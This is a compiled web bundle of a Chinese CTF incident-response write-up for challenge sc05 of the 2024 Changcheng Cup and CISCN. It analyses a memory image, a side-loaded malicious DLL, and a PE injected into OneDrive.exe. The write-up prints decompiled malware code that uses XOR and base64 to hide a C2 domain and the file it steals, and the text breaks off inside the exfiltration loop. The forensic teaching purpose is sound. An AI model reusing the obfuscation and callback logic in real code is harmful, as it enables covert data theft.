"use strict";(self.webpackChunktarget_machines_write_up=self.webpackChunktarget_machines_write_up||[]).push([[42745],{56798:(n,e,s)=>{s.r(e),s.d(e,{assets:()=>a,contentTitle:()=>r,default:()=>h,frontMatter:()=>l,metadata:()=>i,toc:()=>t});var i=s(13161),d=s(74848),c=s(28453);const l={slug:"2024CCB&CISCN-sc05",title:"2024 \u957f\u57ce\u676f & \u56fd\u8d5b \u521d\u8d5b \u5a01\u80c1\u68c0\u6d4b\u4e0e\u7f51\u7edc\u6d41\u91cf\u5206\u6790 sc05",authors:"Randark",toc_max_heading_level:5,tags:["CTF","Incident-Response"]},r=void 0,a={authorsImageUrls:[void 0]},t=[{value:"\u81f4\u8c22",id:"\u81f4\u8c22",level:2},{value:"First of all",id:"first-of-all",level:2},{value:"1",id:"1",level:2},{value:"2",id:"2",level:2},{value:"3",id:"3",level:2},{value:"4",id:"4",level:2},{value:"5",id:"5",level:2}];function o(n){const e={a:"a",admonition:"admonition",blockquote:"blockquote",code:"code",h2:"h2",img:"img",li:"li",p:"p",pre:"pre",ul:"ul",...(0,c.R)(),...n.components};return(0,d.jsxs)(d.Fragment,{children:[(0,d.jsx)(e.p,{children:"2024 \u957f\u57ce\u676f & \u56fd\u8d5b \u521d\u8d5b \u5a01\u80c1\u68c0\u6d4b\u4e0e\u7f51\u7edc\u6d41\u91cf\u5206\u6790 sc05"}),"\n",(0,d.jsx)(e.p,{children:"\u5b98\u65b9 writeup \u672a\u516c\u5e03\uff0c\u65e0\u6807\u51c6\u7b54\u6848"}),"\n",(0,d.jsx)(e.admonition,{type:"info",children:(0,d.jsx)(e.p,{children:"\u8fd1\u65e5\u67d0\u516c\u53f8\u7f51\u7edc\u7ba1\u7406\u5458\u8001\u5f20\u5728\u5bf9\u5b89\u5168\u8bbe\u5907\u8fdb\u884c\u65e5\u5e38\u5de1\u68c0\u8fc7\u7a0b\u4e2d\u53d1\u73b0\u9632\u706b\u5899\u8bbe\u5907\u65e5\u5fd7\u4e2d\u4ea7\u751f\u4e86 1 \u6761\u9ad8\u5371\u544a\u8b66\uff0c\u544a\u8b66 IP \u4e3a 134.6.4.12 (\u7b80\u79f0 IP1)\uff0c\u5728\u76d1\u6d4b\u5230\u53ef\u7591\u7f51\u7edc\u6d3b\u52a8\u540e\uff0c\u8001\u5f20\u7acb\u523b\u5bf9\u78c1\u76d8\u548c\u5185\u5b58\u5236\u505a\u4e86\u955c\u50cf\u3002\u4e3a\u8003\u6821\u81ea\u5df1\u521a\u6536\u7684\u7b2c\u4e00\u4e2a\u5f92\u5f1f\u674e\u534e\uff0c\u8001\u5f20\u5faa\u5e8f\u6e10\u8fdb\uff0c\u5e03\u7f6e\u4e86 5 \u9053\u95ee\u9898\u3002\u5047\u5982\u4f60\u662f\u674e\u534e\uff0c\u8bf7\u4f60\u6839\u636e\u63d0\u4f9b\u7684\u9632\u706b\u5899\u65e5\u5fd7\u3001\u78c1\u76d8\u955c\u50cf\u53ca\u5185\u5b58\u955c\u50cf\u6587\u4ef6\u5bf9\u4e3b\u673a\u5f00\u5c55\u7f51\u7edc\u5b89\u5168\u68c0\u67e5\u5206\u6790\uff0c\u5e76\u6839\u636e 5 \u9053\u95ee\u9898\u63d0\u793a\uff0c\u8ba1\u7b97\u5e76\u63d0\u4ea4\u76f8\u5e94 flag\u3002"})}),"\n",(0,d.jsx)(e.h2,{id:"\u81f4\u8c22",children:"\u81f4\u8c22"}),"\n",(0,d.jsx)(e.p,{children:"\u611f\u8c22\u4ee5\u4e0b\u5404\u4f4d\u5e08\u5085\u6ca1\u6709\u5acc\u5f03\u6211\u70e6\u4eba\uff0c\u5e76\u5bf9\u6211\u63d0\u4f9b\u5e2e\u52a9 (\u6392\u540d\u4e0d\u5206\u5148\u540e)"}),"\n",(0,d.jsxs)(e.ul,{children:["\n",(0,d.jsx)(e.li,{children:"Tokeii"}),"\n",(0,d.jsx)(e.li,{children:"penguin"}),"\n",(0,d.jsx)(e.li,{children:"b3nguang"}),"\n",(0,d.jsx)(e.li,{children:"\u6211\u597d\u60f3\u7761\u89c9"}),"\n",(0,d.jsx)(e.li,{children:"0xfc"}),"\n"]}),"\n",(0,d.jsx)(e.h2,{id:"first-of-all",children:"First of all"}),"\n",(0,d.jsxs)(e.p,{children:["\u542f\u52a8 ",(0,d.jsx)(e.code,{children:"MemProcFS"})]}),"\n",(0,d.jsx)(e.pre,{children:(0,d.jsx)(e.code,{className:"language-bash",children:'PS D:\\_Tools\\MemProcFS_files_and_binaries_v5.13.3-win_x64-20241218> .\\memprocfs.exe  -license-accept-elastic-license-2-0 -f "D:\\Downloads\\38c44f100028b56e09dc48522385fa95\\\u9644\u4ef6\\\u5185\u5b58\\Windows 10 x64-Snapshot13.vmem" -forensic 1\nDEVICE: WARN: No VMware memory regions located - file will be treated as single-region.\nInitialized 64-bit Windows 10.0.19045\n\n==============================  MemProcFS  ==============================\n - Author:           Ulf Frisk - pcileech@frizk.net\n - Info:             https://github.com/ufrisk/MemProcFS\n - Discord:          https://discord.gg/pcileech\n - License:          GNU Affero General Public License v3.0\n   ---------------------------------------------------------------------\n   MemProcFS is free open source software. If you find it useful please\n   become a sponsor at: https://github.com/sponsors/ufrisk Thank You :)\n   ---------------------------------------------------------------------\n - Version:          5.13.3 (Windows)\n - Mount Point:      M:\\\n - Tag:              19045_7c025429\n - Operating System: Windows 10.0.19045 (X64)\n==========================================================================\n\n[FORENSIC] Forensic mode completed in 12s.\n'})}),"\n",(0,d.jsx)(e.h2,{id:"1",children:"1"}),"\n",(0,d.jsxs)(e.blockquote,{children:["\n",(0,d.jsxs)(e.p,{children:["IP1 \u5730\u5740\u9996\u6b21\u88ab\u8bf7\u6c42\u65f6\u95f4\u662f\u591a\u4e45\uff1f\u8ba1\u7b97\u5185\u5bb9\u5982\uff1a",(0,d.jsx)(e.code,{children:"2020/05/18_19:35:10"})," \u63d0\u4ea4\u683c\u5f0f\uff1a",(0,d.jsx)(e.code,{children:"flag{32\u4f4d\u5927\u5199MD5\u503c}"})]}),"\n"]}),"\n",(0,d.jsxs)(e.p,{children:["\u9898\u76ee\u9644\u4ef6\u63d0\u4f9b\u4e86 ",(0,d.jsx)(e.code,{children:"firewall.xlsx"})," \u9632\u706b\u5899\u65e5\u5fd7\u6570\u636e\uff0c\u76f4\u63a5\u641c\u7d22\u5c31\u597d"]}),"\n",(0,d.jsx)(e.p,{children:(0,d.jsx)(e.img,{alt:"img",src:s(62238).A+"",width:"2560",height:"1540"})}),"\n",(0,d.jsx)(e.p,{children:(0,d.jsx)(e.img,{alt:"img",src:s(38070).A+"",width:"2560",height:"1540"})}),"\n",(0,d.jsx)(e.p,{children:"\u53ef\u4ee5\u53d1\u73b0\uff0c\u5efa\u7acb TCP \u8fde\u63a5\u7684\u65f6\u95f4\u8981\u65e9\u4e8e HTTP \u8fde\u63a5\uff0c\u6240\u4ee5\u7b54\u6848\u662f\u5efa\u7acb TCP \u8fde\u63a5\u7684\u65f6\u95f4"}),"\n",(0,d.jsx)(e.pre,{children:(0,d.jsx)(e.code,{className:"language-flag",children:"flag{MD5(2024/11/09_16:22:42)}\nflag{01DF5BC2388E287D4CC8F11EA4D31929}\n"})}),"\n",(0,d.jsx)(e.h2,{id:"2",children:"2"}),"\n",(0,d.jsxs)(e.blockquote,{children:["\n",(0,d.jsxs)(e.p,{children:["IP1 \u5730\u5740\u5bf9\u5e94\u7684\u5c0f\u9a6c\u7a0b\u5e8f MD5 \u662f\u591a\u5c11\uff1f\u63d0\u4ea4\u683c\u5f0f\uff1a",(0,d.jsx)(e.code,{children:"flag{32\u4f4d\u5927\u5199MD5\u503c}"})]}),"\n"]}),"\n",(0,d.jsxs)(e.p,{children:["\u5728 ",(0,d.jsx)(e.code,{children:"admin"})," \u7528\u6237\u7684\u684c\u9762\u53d1\u73b0\u4e00\u4e2a ",(0,d.jsx)(e.code,{children:"HRSw\u200bord.\u200blnk"})," \u5feb\u6377\u65b9\u5f0f"]}),"\n",(0,d.jsxs)(e.p,{children:["\u8df3\u8f6c\u5230 ",(0,d.jsx)(e.code,{children:"Root\\Users\\admin\\AppData\\Roaming\\HRSword5-green\\HRSword.exe"})]}),"\n",(0,d.jsxs)(e.blockquote,{children:["\n",(0,d.jsx)(e.p,{children:"\u8fd9\u4e0d\u662f\u5f88\u660e\u663e\u561b\uff0c\u8c01\u5bb6\u53ef\u6267\u884c\u6587\u4ef6\u653e Appdata \u76ee\u5f55"}),"\n"]}),"\n",(0,d.jsxs)(e.p,{children:["\u5c06 ",(0,d.jsx)(e.code,{children:"HRSword5-green"})," \u6587\u4ef6\u5939\u5bfc\u51fa\u8fdb\u884c\u5206\u6790\uff0c\u53d1\u73b0\u4e00\u4f17 ",(0,d.jsx)(e.code,{children:"dll"})," \u6587\u4ef6\u4e2d\uff0c\u5c31 ",(0,d.jsx)(e.code,{children:"uactmon.dll"})," \u6ca1\u6709\u6570\u5b57\u7b7e\u540d\uff0c\u8fd9\u4e00\u70b9\u5f88\u53ef\u7591"]}),"\n",(0,d.jsxs)(e.p,{children:["\u5728\u672c\u5730\u5bf9 ",(0,d.jsx)(e.code,{children:"Func_1"})," \u51fd\u6570\u8fdb\u884c\u5206\u6790"]}),"\n",(0,d.jsx)(e.p,{children:(0,d.jsx)(e.img,{alt:"img",src:s(81881).A+"",width:"2560",height:"1540"})}),"\n",(0,d.jsx)(e.p,{children:"\u4e0b\u4e2a\u65ad\u70b9\uff0c\u52a8\u8c03\u770b\u4e00\u4e0b"}),"\n",(0,d.jsx)(e.p,{children:(0,d.jsx)(e.img,{alt:"img",src:s(94383).A+"",width:"2560",height:"1540"})}),"\n",(0,d.jsx)(e.p,{children:(0,d.jsx)(e.img,{alt:"img",src:s(80812).A+"",width:"2560",height:"1540"})}),"\n",(0,d.jsxs)(e.p,{children:["\u5373\u53ef\u786e\u5b9a ",(0,d.jsx)(e.code,{children:"uactmon.dll"})," \u662f\u5c0f\u9a6c\uff0c\u91c7\u7528\u7684\u662f\u767d\u52a0\u9ed1\u7684\u5bf9\u6297\u65b9\u5f0f"]}),"\n",(0,d.jsx)(e.pre,{children:(0,d.jsx)(e.code,{className:"language-bash",children:"PS D:\\Desktop\\HRSword5-green> get-FileHash -Algorithm MD5 .\\uactmon.dll\n\nAlgorithm       Hash                                                                   Path\n---------       ----                                                                   ----\nMD5             AE68F576C8671A9A32CDD33FBE483778                                       D:\\Desktop\\HRSword5-green\\uactm\u2026\n"})}),"\n",(0,d.jsx)(e.pre,{children:(0,d.jsx)(e.code,{className:"language-flag",children:"flag{MD5(uactmon.dll)}\nflag{AE68F576C8671A9A32CDD33FBE483778}\n"})}),"\n",(0,d.jsx)(e.h2,{id:"3",children:"3"}),"\n",(0,d.jsxs)(e.blockquote,{children:["\n",(0,d.jsxs)(e.p,{children:["\u5927\u9a6c\u7a0b\u5e8f\u8fd0\u884c\u5728\u54ea\u4e2a\u8fdb\u7a0b\u4e2d\uff1f\u8ba1\u7b97\u5185\u5bb9\uff1a",(0,d.jsx)(e.code,{children:"PID-\u8fdb\u7a0b\u540d"}),"\uff0c\u5982 ",(0,d.jsx)(e.code,{children:"123-cmd.exe"})," \u63d0\u4ea4\u683c\u5f0f\uff1a",(0,d.jsx)(e.code,{children:"flag{32\u4f4d\u5927\u5199MD5\u503c}"})]}),"\n"]}),"\n",(0,d.jsxs)(e.p,{children:["\u9996\u5148\uff0c\u8fd9\u4e2a\u9898\u76ee\u7684\u8868\u8ff0\u5c31\u5f88\u6709\u610f\u601d\uff0c\u8868\u8fbe\u4e3a",(0,d.jsx)(e.code,{children:"\u5728\u54ea\u4e2a\u8fdb\u7a0b\u4e2d"}),"\u800c\u4e0d\u662f",(0,d.jsx)(e.code,{children:"\u662f\u54ea\u4e2a\u8fdb\u7a0b"})]}),"\n",(0,d.jsx)(e.p,{children:"\u6709\u8fc7\u76f8\u5173\u6e17\u900f\u7ecf\u9a8c\u548c\u514d\u6740\u7ecf\u9a8c\u7684\u5e08\u5085\uff0c\u5e94\u8be5\u5c31\u80fd\u53cd\u5e94\u8fc7\u6765\uff0c\u8fd9\u4e2a\u5176\u5b9e\u5c31\u662f\u5728\u6697\u793a\uff0c\u5b58\u5728\u6709\u8fdb\u7a0b\u6ce8\u5165"}),"\n",(0,d.jsx)(e.p,{children:(0,d.jsx)(e.a,{href:"https://attack.mitre.org/techniques/T1055/",children:"Process Injection, Technique T1055 - Enterprise | MITRE ATT&CK\xae"})}),"\n",(0,d.jsxs)(e.p,{children:["\u8fdb\u7a0b\u6ce8\u5165\u8fd9\u91cc\uff0c\u672c\u8eab ",(0,d.jsx)(e.code,{children:"Volatility3"})," \u63d0\u4f9b\u4e86 ",(0,d.jsx)(e.a,{href:"https://volatility3.readthedocs.io/en/latest/volatility3.plugins.windows.malfind.html#volatility3.plugins.windows.malfind.Malfind",children:"windows.malfind"})," \u63d2\u4ef6\u5b9e\u73b0\u4e86\u6ce8\u5165\u4ee3\u7801\u7684\u68c0\u6d4b\uff0c\u540c\u65f6 ",(0,d.jsx)(e.code,{children:"MemProcFS"})," \u4e5f\u63d0\u4f9b\u4e86 ",(0,d.jsx)(e.a,{href:"https://github.com/ufrisk/MemProcFS/wiki/FS_FindEvil",children:"findevil"})," \u5b9e\u73b0\u5bf9\u6076\u610f\u8f6f\u4ef6\u7684\u68c0\u6d4b"]}),"\n",(0,d.jsx)(e.p,{children:"\u4f7f\u7528 Volatility3 \u8fdb\u884c\u5206\u6790"}),"\n",(0,d.jsx)(e.pre,{children:(0,d.jsx)(e.code,{className:"language-bash",children:"PS D:\\Downloads\\38c44f100028b56e09dc48522385fa95\\\u9644\u4ef6\\\u5185\u5b58> vol -f '.\\Windows 10 x64-Snapshot13.vmem' windows.malfind\nVolatility 3 Framework 2.7.0\nProgress:  100.00               PDB scanning finished\nPID     Process Start VPN       End VPN Tag     Protection      CommitCharge    PrivateMemory   File output     Notes  Hexdump  Disasm\n......\n5392    OneDrive.exe    0x8d20000       0x8d2afff       VadS    PAGE_EXECUTE_READWRITE  11      1       Disabled        MZ header\n4d 5a 90 00 03 00 00 00 MZ......\n04 00 00 00 ff ff 00 00 ........\nb8 00 00 00 00 00 00 00 ........\n40 00 00 00 00 00 00 00 @.......\n00 00 00 00 00 00 00 00 ........\n00 00 00 00 00 00 00 00 ........\n00 00 00 00 00 00 00 00 ........\n00 00 00 00 08 01 00 00 ........\n0x8d20000:      dec     ebp\n0x8d20001:      pop     edx\n0x8d20002:      nop\n0x8d20003:      add     byte ptr [ebx], al\n0x8d20005:      add     byte ptr [eax], al\n0x8d20007:      add     byte ptr [eax + eax], al\n0x8d2000a:      add     byte ptr [eax], al\n"})}),"\n",(0,d.jsx)(e.p,{children:"\u5f88\u660e\u663e\uff0c\u6ce8\u5165\u4e86\u4e00\u4e2a\u53ef\u6267\u884c\u7684\u6570\u636e\u6bb5\uff0c\u5927\u6982\u7387\u662f\u4e00\u4efd dll"}),"\n",(0,d.jsxs)(e.p,{children:["\u540c\u65f6\u4f7f\u7528 ",(0,d.jsx)(e.code,{children:"MemProcFS"})," \u8fdb\u884c\u5206\u6790"]}),"\n",(0,d.jsx)(e.pre,{children:(0,d.jsx)(e.code,{className:"language-plaintext",metastring:'title="\\forensic\\findevil\\findevil.txt"',children:"......\n0002   5392 OneDrive.exe   PE_INJECT       0000000008d20000 Module:[0x8d20000.dll]\n"})}),"\n",(0,d.jsxs)(e.p,{children:["\u90a3\u5c31\u5f88\u660e\u663e\u4e86\uff0c\u5e38\u89c4\u8fdb\u7a0b\u6839\u672c\u4e0d\u4f1a\u4f7f\u7528\u6ce8\u5165\u6765\u5b9e\u73b0 dll \u52a0\u8f7d\uff0c\u57fa\u672c\u53ef\u4ee5\u65ad\u5b9a\u6709\u9488\u5bf9 ",(0,d.jsx)(e.code,{children:"5392-OneDrive.exe"})," \u7684\u6ce8\u5165\u653b\u51fb\u884c\u4e3a"]}),"\n",(0,d.jsx)(e.pre,{children:(0,d.jsx)(e.code,{className:"language-flag",children:"flag{MD5(5392-OneDrive.exe)}\nflag{B3DCB206180679E29468726C27FC1A68}\n"})}),"\n",(0,d.jsx)(e.h2,{id:"4",children:"4"}),"\n",(0,d.jsxs)(e.blockquote,{children:["\n",(0,d.jsxs)(e.p,{children:["\u5927\u9a6c\u7a0b\u5e8f\u5907\u7528\u56de\u8fde\u7684\u57df\u540d\u662f\u591a\u5c11\uff1f\u8ba1\u7b97\u5185\u5bb9\u5982\uff1a",(0,d.jsx)(e.code,{children:"www.baidu.com"})," \u63d0\u4ea4\u683c\u5f0f\uff1a",(0,d.jsx)(e.code,{children:"flag{32\u4f4d\u5927\u5199MD5\u503c}"})]}),"\n"]}),"\n",(0,d.jsxs)(e.p,{children:["\u5bf9\u4e0a\u4e00\u9898\uff0c\u5728 ",(0,d.jsx)(e.code,{children:"5392-OneDrive.exe"})," \u8fdb\u7a0b\u4e2d\u53d1\u73b0\u7684\u6ce8\u5165\u884c\u4e3a\uff0c\u5c06\u6ce8\u5165\u7684 dll \u6570\u636e\u63d0\u53d6\u51fa\u6765"]}),"\n",(0,d.jsxs)(e.p,{children:["\u5bf9\u4e8e ",(0,d.jsx)(e.code,{children:"Volatility3"})," \u63d0\u53d6\u6ce8\u5165\u7684 dll \u6587\u4ef6"]}),"\n",(0,d.jsx)(e.pre,{children:(0,d.jsx)(e.code,{className:"language-bash",children:"PS D:\\Downloads\\38c44f100028b56e09dc48522385fa95\\\u9644\u4ef6\\\u5185\u5b58> vol -f '.\\Windows 10 x64-Snapshot13.vmem' windows.malfind --pid 5392 --dump\nVolatility 3 Framework 2.7.0\nProgress:  100.00               PDB scanning finished\nPID     Process Start VPN       End VPN Tag     Protection      CommitCharge    PrivateMemory   File output     Notes  Hexdump  Disasm\n\n5392    OneDrive.exe    0x8d20000       0x8d2afff       VadS    PAGE_EXECUTE_READWRITE  11      1       pid.5392.vad.0x8d20000-0x8d2afff.dmp    MZ header\n4d 5a 90 00 03 00 00 00 MZ......\n04 00 00 00 ff ff 00 00 ........\nb8 00 00 00 00 00 00 00 ........\n40 00 00 00 00 00 00 00 @.......\n00 00 00 00 00 00 00 00 ........\n00 00 00 00 00 00 00 00 ........\n00 00 00 00 00 00 00 00 ........\n00 00 00 00 08 01 00 00 ........\n0x8d20000:      dec     ebp\n0x8d20001:      pop     edx\n0x8d20002:      nop\n0x8d20003:      add     byte ptr [ebx], al\n0x8d20005:      add     byte ptr [eax], al\n0x8d20007:      add     byte ptr [eax + eax], al\n0x8d2000a:      add     byte ptr [eax], al\n"})}),"\n",(0,d.jsxs)(e.p,{children:["\u5bf9\u4e8e ",(0,d.jsx)(e.code,{children:"MemProcFS"})," \u800c\u8a00\uff0c\u6587\u4ef6\u4f4d\u4e8e ",(0,d.jsx)(e.code,{children:"\\pid\\5392\\modules\\_INJECTED-0x8d20000.dll\\pefile.dll"})]}),"\n",(0,d.jsxs)(e.p,{children:[(0,d.jsx)(e.code,{children:"Volatility3"})," \u548c ",(0,d.jsx)(e.code,{children:"MemProcFS"})," \u4e24\u4e2a\u6846\u67b6\u6240\u63d0\u53d6\u51fa\u6765\u7684 dll \u6570\u636e\u662f\u5b58\u5728\u6709\u5dee\u5f02\u7684"]}),"\n",(0,d.jsx)(e.p,{children:(0,d.jsx)(e.img,{alt:"img",src:s(48447).A+"",width:"2560",height:"1540"})}),"\n",(0,d.jsxs)(e.p,{children:[(0,d.jsx)(e.code,{children:"MemProcFS"})," \u6846\u67b6\u6240\u63d0\u53d6\u51fa\u6765\u7684 ",(0,d.jsx)(e.code,{children:"pefile.dll"})," \u6587\u4ef6\uff0c\u7531\u4e8e\u7ecf\u8fc7\u4e86\u91cd\u7ec4\uff0c\u5bfc\u81f4\u7b26\u53f7\u8868\u4fe1\u606f\u4e22\u5931\uff0c\u5efa\u8bae\u4f7f\u7528 ",(0,d.jsx)(e.code,{children:"Volatility3"})," \u5bfc\u51fa\u7684 ",(0,d.jsx)(e.code,{children:"pid.5392.vad.0x8d20000-0x8d2afff.dmp"})," \u6587\u4ef6"]}),"\n",(0,d.jsxs)(e.p,{children:["\u4f7f\u7528 ",(0,d.jsx)(e.code,{children:"IDA"})," \u5bf9 ",(0,d.jsx)(e.code,{children:"pid.5392.vad.0x8d20000-0x8d2afff.dmp"})," \u6587\u4ef6\u7684 ",(0,d.jsx)(e.code,{children:"DllMain"})," \u51fd\u6570\u8fdb\u884c\u5206\u6790"]}),"\n",(0,d.jsx)(e.p,{children:(0,d.jsx)(e.img,{alt:"img",src:s(55935).A+"",width:"2560",height:"1540"})}),"\n",(0,d.jsx)(e.p,{children:"\u5bf9\u53cd\u7f16\u8bd1\u7ed3\u679c\u8fdb\u884c\u5206\u6790\u540e\uff0c\u6279\u6ce8\u8fc7\u7684\u53cd\u7f16\u8bd1\u7ed3\u679c"}),"\n",(0,d.jsx)(e.pre,{children:(0,d.jsx)(e.code,{className:"language-c",children:'BOOL __stdcall DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved)\n{\n    // ......\n\n    v21 = fdwReason;\n    if ( fdwReason == 1 )\n    {\n        Buffer = 0;\n        BufferCount = 0;\n        v19 = dupenv_s(&Buffer, &BufferCount, "appdata");// \u8bfb\u53d6 appdata \u76ee\u5f55\n        v22 = (char *)unknown_libname_12(BufferCount + 16);\n        v40 = v22;\n\n        Str[0] = 48;\n        Str[1] = 7;\n        Str[2] = 18;\n        Str[3] = 2;\n        Str[4] = 48;\n        Str[5] = 19;\n        Str[6] = 95;\n        Str[7] = 1;\n        Str[8] = 8;\n        qmemcpy(v63, "X$^j", sizeof(v63));\n        for ( i = 0; i < 0xD; ++i )\n            Str[i] ^= 0x6Au;                    // \u5f02\u6216\u89e3\u7801\n                                                // \u6700\u7ec8\u5f97\u5230 flag.docx\n        memset(v52, 0, sizeof(v52));\n        v3 = strlen(Str);\n        base64_decode((int)Str, v3, (int)v52);  // sub_10001860\n\n        sprintf_s(v40, BufferCount + 16, "%s/%s", Buffer, v52);\n        v43 = 0;\n        v45 = 0;\n        v18 = dupenv_s(&v43, &v45, "temp");\n        v23 = (char *)unknown_libname_12(v45 + 16);\n        v39 = v23;\n\n        qmemcpy(v60, "9X ", 3);\n        v60[3] = 29;\n        v60[4] = 56;\n        v60[5] = 46;\n        v60[6] = 59;\n        v60[7] = 94;\n        v60[8] = 38;\n        v60[9] = 4;\n        v60[10] = 56;\n        v60[11] = 30;\n        qmemcpy(v61, "\\t+WW", sizeof(v61));\n        for ( j = 0; j < 0x10; ++j )\n            v60[j] ^= 0x6Au;                    // \u5f02\u6216\u89e3\u7801\n                                                // \u6700\u7ec8\u5f97\u5230 KbpD48.tmp\n        memset(v53, 0, sizeof(v53));\n        v4 = strlen(v60);\n        base64_decode((int)v60, v4, (int)v53);\n\n        sprintf_s(v39, v45 + 16, "%s/%s", v43, v53);\n\n        v56[0] = 11;\n        v56[1] = 34;\n        v56[2] = 56;\n        v56[3] = 90;\n        v56[4] = 9;\n        v56[5] = 46;\n        v56[6] = 5;\n        v56[7] = 28;\n        v56[8] = 38;\n        v56[9] = 89;\n        v56[10] = 14;\n        v56[11] = 89;\n        v56[12] = 14;\n        v56[13] = 19;\n        v56[14] = 95;\n        v56[15] = 5;\n        v56[16] = 9;\n        v56[17] = 4;\n        v56[18] = 60;\n        v56[19] = 29;\n        v56[20] = 48;\n        v56[21] = 45;\n        v56[22] = 44;\n        v56[23] = 90;\n        v56[24] = 48;\n        v56[25] = 57;\n        v56[26] = 95;\n        v56[27] = 31;\n        qmemcpy(v57, "02;W", sizeof(v57));\n        for ( k = 0; k < 0x20; ++k )\n            v56[k] ^= 0x6Au;                    // \u5f02\u6216\u89e3\u7801\n                                                // \u6700\u7ec8\u5f97\u5230 http://www.hrupdate.net\n        v58[0] = 11;\n        v58[1] = 34;\n        v58[2] = 56;\n        v58[3] = 90;\n        v58[4] = 9;\n        v58[5] = 46;\n        v58[6] = 5;\n        v58[7] = 28;\n        v58[8] = 38;\n        v58[9] = 89;\n        v58[10] = 14;\n        v58[11] = 89;\n        v58[12] = 14;\n        v58[13] = 19;\n        v58[14] = 95;\n        v58[15] = 4;\n        v58[16] = 8;\n        v58[17] = 89;\n        v58[18] = 60;\n        v58[19] = 29;\n        v58[20] = 48;\n        v58[21] = 45;\n        v58[22] = 44;\n        v58[23] = 90;\n        v58[24] = 48;\n        v58[25] = 57;\n        v58[26] = 95;\n        v58[27] = 31;\n        qmemcpy(v59, "02;W", sizeof(v59));\n        for ( m = 0; m < 0x20; ++m )\n            v58[m] ^= 0x6Au;                    // \u5f02\u6216\u89e3\u7801\n                                                // \u6700\u7ec8\u5f97\u5230 http://www.hrupdate.net\n        memset(v54, 0, sizeof(v54));\n        memset(v55, 0, sizeof(v55));\n        v5 = strlen(v56);\n        base64_decode((int)v56, v5, (int)v54);\n        v6 = strlen(v58);\n        base64_decode((int)v58, v6, (int)v55);\n        while ( 1 )\n        {\n            // ......\n        }\n    }\n    return 1;\n}\n'})}),"\n",(0,d.jsx)(e.p,{children:"\u5176\u4e2d\u7684\u5f02\u6216 + Base64 \u89e3\u7801\uff0c\u53ef\u4ee5\u53c2\u8003\u4ee5\u4e0b\u811a\u672c\u7684\u5b9e\u73b0"}),"\n",(0,d.jsx)(e.pre,{children:(0,d.jsx)(e.code,{className:"language-python",children:'from base64 import b64decode\n\ndecompiled_code = """\nStr[0] = 48;\nStr[1] = 7;\nStr[2] = 18;\nStr[3] = 2;\nStr[4] = 48;\nStr[5] = 19;\nStr[6] = 95;\nStr[7] = 1;\nStr[8] = 8;\n"""\n\ndata = [i.split(";")[0].split(" = ")[1] for i in decompiled_code.strip().split("\\n")]\nfor i in "X$^j":\n    data.append(str(ord(i)))\ndata = [int(i) ^ 0x6A for i in data]\nb64encoded_data = "".join([chr(i) for i in data])\ndata = b64decode(b64encoded_data)\nprint(data.decode())\n'})}),"\n",(0,d.jsxs)(e.p,{children:["\u5373\u53ef\u5f97\u5230\u56de\u8fde\u7684\u57df\u540d\u4e3a ",(0,d.jsx)(e.code,{children:"http://www.hrupdate.net"})]}),"\n",(0,d.jsx)(e.pre,{children:(0,d.jsx)(e.code,{className:"language-flag",children:"flag{MD5(http://www.hrupdate.net)}\nflag{46A5F85E24C4EB95DC9F9FAED5E7AF6A}\n"})}),"\n",(0,d.jsx)(e.h2,{id:"5",children:"5"}),"\n",(0,d.jsxs)(e.blockquote,{children:["\n",(0,d.jsxs)(e.p,{children:["\u653b\u51fb\u8005\u6700\u7ec8\u7a83\u53d6\u6570\u636e\u7684\u6587\u4ef6\u4e2d\u5305\u542b\u7684 flag \u503c\uff1f \u63d0\u4ea4\u683c\u5f0f\uff1a",(0,d.jsx)(e.code,{children:"flag{xxx}"}),", \u6ce8\u610f\u5927\u5c0f ",(0,d.jsx)(e.code,{children:"FLAG{xx}"})," \u8981\u8f6c\u6362\u4e3a\u5c0f\u5199 ",(0,d.jsx)(e.code,{children:"flag{xx}"})]}),"\n"]}),"\n",(0,d.jsxs)(e.p,{children:["\u4e0a\u6587\u89e3\u5bc6\u5f97\u5230\u7684\u6587\u4ef6\u540d\u4e2d\uff0c\u6587\u4ef6\u4f4d\u4e8e ",(0,d.jsx)(e.code,{children:"Root\\Users\\admin\\AppData\\Local\\Temp\\KbpD48.tmp"})]}),"\n",(0,d.jsx)(e.p,{children:(0,d.jsx)(e.img,{alt:"img",src:s(64364).A+"",width:"1813",height:"1420"})}),"\n",(0,d.jsxs)(e.p,{children:["\u5ffd\u7565\u6389\u524d\u9762\u5df2\u5206\u6790\u90e8\u5206\uff0c\u8fdb\u5165\u5230 ",(0,d.jsx)(e.code,{children:"while ( 1 )"})," \u5faa\u73af\u4e2d"]}),"\n",(0,d.jsx)(e.pre,{children:(0,d.jsx)(e.code,{className:"language-c",children:'while ( 1 )\n{\n    sub_10004350(v13, v14);\n    v64 = 0;\n    v33 = v54;\n    v30 = sub_10001B00(v54, v51);\n    if ( v30 )\n    {\n        v33 = v55;\n        sub_10004190(v51);\n        v30 = sub_10001B00(v33, v51);\n    }\n    if ( !v30 && sub_10004110("Get file", 0) != -1 )\n    {\n        sub_100026B0(0xB8u);\n        sub_10004000(v40, 33, 64, 1);\n        LOBYTE(v64) = 1;\n        if ( (unsigned __int8)sub_10003F60(v47) )\n        {\n            sub_100026B0(0xB0u);\n            sub_10003190(v39, 34, 64, 1);\n            LOBYTE(v64) = 2;\n            if ( (unsigned __int8)sub_10003110(v48) )\n            {\n                sub_100026B0(0xB0u);\n                sub_10003030(1);\n                LOBYTE(v64) = 3;\n                v7 = sub_10003F80(v47);\n                std::ostream::operator<<(v50, v7);\n                v24 = std::basic_stringstream<char,std::char_traits<char>,std::allocator<char>>::str(v16);\n                v31 = unknown_libname_4(v24);\n                sub_100042B0(v16);\n                v20 = (char *)unknown_libname_12(2 * v31 + 2);\n                v41 = v20;\n                memset(v20, 0, 2 * v31 + 2);\n                v27 = std::basic_stringstream<char,std::char_traits<char>,std::allocator<char>>::str(v15);\n                v26 = v27;\n                LOBYTE(v64) = 4;\n                v12 = v41;\n                v11 = v31;\n                v8 = sub_10004170(v27);\n                v28 = sub_10001650(v8, v11, v12);\n                LOBYTE(v64) = 3;\n                sub_100042B0(v15);\n                qmemcpy(v32, ";=", 2);\n                v32[2] = -2;\n                v32[3] = 112;\n                v32[4] = 90;\n                v32[5] = -41;\n                v32[6] = -116;\n                v32[7] = 34;\n                v32[8] = -64;\n                v32[9] = 109;\n                v32[10] = -76;\n                v32[11] = -40;\n                v32[12] = 87;\n                v32[13] = 114;\n                v32[14] = -33;\n                v32[15] = -41;\n                v32[16] = 55;\n                v32[17] = 114;\n                v32[18] = -45;\n                v32[19] = 127;\n                v32[20] = 